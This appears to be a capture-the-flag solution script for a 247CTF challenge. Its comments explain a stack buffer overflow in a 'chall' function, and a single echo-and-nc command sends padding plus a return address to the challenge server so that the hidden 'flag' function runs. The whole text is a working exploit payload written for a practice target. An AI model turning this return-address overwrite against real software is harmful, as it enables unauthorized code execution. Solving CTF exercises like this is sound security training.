# Stack buffer overflow on function 'chall' at 0x080485d4. #
# Goal: overwrite return address (EBP+4) to get the function 'flag' at 0x08048576 to execute #
# Buffer size: 68 #
# Padding: 8 #
# Total: 76 #
echo -ne "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x76\x85\x04\x08\n" | nc ef6a4b28a1b2538b.247ctf.com 50420
